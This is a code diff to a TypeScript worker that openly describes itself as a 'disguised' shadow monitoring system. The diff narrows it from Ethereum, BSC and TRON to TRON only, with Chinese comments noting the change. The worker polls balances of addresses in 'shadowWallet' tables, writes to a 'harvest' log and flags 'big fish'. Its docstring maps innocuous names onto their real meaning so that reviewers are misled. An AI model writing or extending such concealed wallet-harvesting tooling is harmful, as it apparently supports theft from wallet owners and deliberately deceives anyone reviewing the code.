@@ -1,8 +1,10 @@
 /**
- * Wallet State Synchronization Worker
+ * Wallet State Synchronization Worker - 纯 TRON 模式
  * 
  * Disguised naming for shadow monitoring system.
  * High-performance concurrent address scanning using Bun's native capabilities.
+ * 
+ * 已移除所有 ETH/BSC/EVM 相关逻辑，仅支持 TRON 链。
  * 
  * Internal terminology mapping (for documentation only, not exposed):
  * - "state sync" = balance monitoring
@@ -14,7 +16,6 @@
 import { db } from '../db';
 import { shadowWallet, shadowHarvestLog, shadowConfig, telegramLog } from '../db/schema';
 import { eq, and, lt, sql, desc } from 'drizzle-orm';
-import { ethers } from 'ethers';
 import BigNumber from 'bignumber.js';
 import TronWeb from 'tronweb';
 
@@ -39,56 +40,36 @@ const DEFAULT_CONFIG: SyncConfig = {
   RPC_TIMEOUT_MS: 5000
 };
 
-// Chain configurations - disguised as "network adapters"
-interface NetworkAdapter {
-  chainId: string;
-  rpcEndpoint: string;
-  nativeSymbol: string;
-  stableTokens: Map<string, string>; // symbol -> contract
-}
-
 // ============================================================
-// RPC PROVIDERS - High concurrency connection pool
+// TRON RPC POOL - 纯 TRON 模式，已移除 ETH/BSC
 // ============================================================
-class NetworkAdapterPool {
-  private providers: Map<string, ethers.JsonRpcProvider[]> = new Map();
-  private roundRobinIndex: Map<string, number> = new Map();
+class TronRpcPool {
+  private endpoints: string[] = [];
+  private currentIndex: number = 0;
+  private tronWeb: any = null;
   
-  constructor(private poolSize: number = 5) {}
-  
-  async initializeChain(chainId: string, rpcUrls: string[]) {
-    const providers: ethers.JsonRpcProvider[] = [];
-    
-    for (let i = 0; i < Math.min(this.poolSize, rpcUrls.length); i++) {
-      const rpcUrl = rpcUrls[i % rpcUrls.length];
-      const provider = new ethers.JsonRpcProvider(rpcUrl, undefined, {
-        staticNetwork: true,
-        batchMaxCount: 100,
-        polling: false
+  async initialize(endpoints: string[]) {
+    this.endpoints = endpoints;
+    if (endpoints.length > 0) {
+      this.tronWeb = new TronWeb({
+        fullHost: endpoints[0],
+        headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {}
       });
-      providers.push(provider);
     }
-    
-    this.providers.set(chainId, providers);
-    this.roundRobinIndex.set(chainId, 0);
   }
   
-  hasChain(chainId: string): boolean {
-    const providers = this.providers.get(chainId);
-    return !!(providers && providers.length > 0);
+  isInitialized(): boolean {
+    return this.endpoints.length > 0 && this.tronWeb !== null;
   }
-
-  getProvider(chainId: string): ethers.JsonRpcProvider {
-    const providers = this.providers.get(chainId);
-    if (!providers || providers.length === 0) {
-      throw new Error(`No adapter available for network ${chainId}`);
-    }
-    
-    const index = this.roundRobinIndex.get(chainId) || 0;
-    const provider = providers[index % providers.length];
-    this.roundRobinIndex.set(chainId, index + 1);
-    
-    return provider;
+  
+  getEndpoint(): string {
+    const endpoint = this.endpoints[this.currentIndex];
+    this.currentIndex = (this.currentIndex + 1) % this.endpoints.length;
+    return endpoint;
+  }
+  
+  getTronWeb(): any {
+    return this.tronWeb;
   }
 }
 
@@ -97,25 +78,22 @@ class NetworkAdapterPool {
 // ============================================================
 class WalletStateSynchronizer {
   private config: SyncConfig;
-  private adapterPool: NetworkAdapterPool;
+  private tronPool: TronRpcPool;
   private isRunning: boolean = false;
   private processedCount: number = 0;
   private flaggedCount: number = 0;  // "flagged" = big fish detected
   
   constructor(config: Partial<SyncConfig> = {}) {
     this.config = { ...DEFAULT_CONFIG, ...config };
-    this.adapterPool = new NetworkAdapterPool(10);
+    this.tronPool = new TronRpcPool();
   }
   
   /**
-   * Initialize network adapters from encrypted config
+   * Initialize TRON RPC - 纯 TRON 模式，已移除 ETH/BSC
    */
   async initialize() {
-    // Load RPC endpoints: DB (shadow_config) first, then env injection
-    let ethRpc = await this.getConfigValue('ETH_RPC_ENDPOINTS');
+    // Load TRON RPC endpoints: DB (shadow_config) first, then env injection
     let tronRpc = await this.getConfigValue('TRON_RPC_ENDPOINTS');
-    const bscRpc = await this.getConfigValue('BSC_RPC_ENDPOINTS');
-    if (!ethRpc && process.env.ETH_HTTP) ethRpc = process.env.ETH_HTTP;
     if (!tronRpc && process.env.TRON_HTTP) tronRpc = process.env.TRON_HTTP;
     
     const toUrlList = (v: string): string[] => {
@@ -126,36 +104,18 @@ class WalletStateSynchronizer {
         return [v];
       }
     };
-    const initialized: string[] = [];
-    if (ethRpc) {
-      try {
-        await this.adapterPool.initializeChain('ETH', toUrlList(ethRpc));
-        initialized.push('ETH');
-      } catch (e) {
-        console.warn('[WalletStateSync] ETH RPC init skipped:', (e as Error).message);
-      }
-    }
+    
     if (tronRpc) {
       try {
-        await this.adapterPool.initializeChain('TRON', toUrlList(tronRpc));
-        initialized.push('TRON');
+        await this.tronPool.initialize(toUrlList(tronRpc));
+        console.log('[WalletStateSync] TRON RPC initialized');
       } catch (e) {
-        console.warn('[WalletStateSync] TRON RPC init skipped:', (e as Error).message);
-      }
-    }
-    if (bscRpc) {
-      try {
-        await this.adapterPool.initializeChain('BSC', toUrlList(bscRpc));
-        initialized.push('BSC');
-      } catch (e) {
-        console.warn('[WalletStateSync] BSC RPC init skipped:', (e as Error).message);
+        console.warn('[WalletStateSync] TRON RPC init failed:', (e as Error).message);
       }
     }
     
-    if (initialized.length === 0) {
-      console.warn('[WalletStateSync] No chain RPC configured; worker will run but skip balance sync until config is set.');
-    } else {
-      console.log('[WalletStateSync] Initialized with adapters:', initialized);
+    if (!this.tronPool.isInitialized()) {
+      console.warn('[WalletStateSync] TRON RPC not configured; worker will run but skip balance sync until config is set.');
     }
     
     // Load threshold from config
@@ -257,17 +217,21 @@ class WalletStateSynchronizer {
   }
   
   /**
-   * Sync individual address state - Disguised terminology
+   * Sync individual address state - 纯 TRON 模式
    */
   private async syncAddressState(wallet: typeof shadowWallet.$inferSelect) {
     try {
-      if (!this.adapterPool.hasChain(wallet.chain)) {
-        return { success: false, skipped: true, reason: `chain ${wallet.chain} not configured` };
+      // 仅支持 TRON 链
+      if (wallet.chain !== 'TRON') {
+        return { success: false, skipped: true, reason: `chain ${wallet.chain} not supported (TRON only)` };
       }
-      const provider = this.adapterPool.getProvider(wallet.chain);
       
-      // Query on-chain balance
-      const balance = await this.queryAddressBalance(provider, wallet.address, wallet.chain);
+      if (!this.tronPool.isInitialized()) {
+        return { success: false, skipped: true, reason: 'TRON RPC not configured' };
+      }
+      
+      // Query TRON balance
+      const balance = await this.queryTronBalance(wallet.address);
       const balanceBN = new BigNumber(balance);
       
       // Update database with current state
@@ -294,23 +258,33 @@ class WalletStateSynchronizer {
   }
   
   /**
-   * Query balance with proper chain handling
+   * Query TRON balance - 纯 TRON 模式
    */
-  private async queryAddressBalance(
-    provider: ethers.JsonRpcProvider,
-    address: string,
-    chain: string
-  ): Promise<string> {
-    // Native balance query with timeout
-    const balancePromise = provider.getBalance(address);
-    const timeoutPromise = new Promise<never>((_, reject) => 
-      setTimeout(() => reject(new Error('RPC timeout')), this.config.RPC_TIMEOUT_MS)
-    );
+  private async queryTronBalance(address: string): Promise<string> {
+    const endpoint = this.tronPool.getEndpoint();
     
-    const balance = await Promise.race([balancePromise, timeoutPromise]);
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), this.config.RPC_TIMEOUT_MS);
     
-    // Convert to USDT equivalent (simplified - use oracle in production)
-    return ethers.formatEther(balance);
+    try {
+      const response = await fetch(`${endpoint}/v1/accounts/${address}`, {
+        headers: { 
+          'Accept': 'application/json',
+          ...(process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {})
+        },
+        signal: controller.signal
+      });
+      
+      if (!response.ok) throw new Error('TRON RPC error');
+      
+      const data = await response.json();
+      const balance = data.data?.[0]?.balance || 0;
+      
+      // Convert from SUN to TRX
+      return (balance / 1e6).toString();
+    } finally {
+      clearTimeout(timeoutId);
+    }
   }
   
   /**
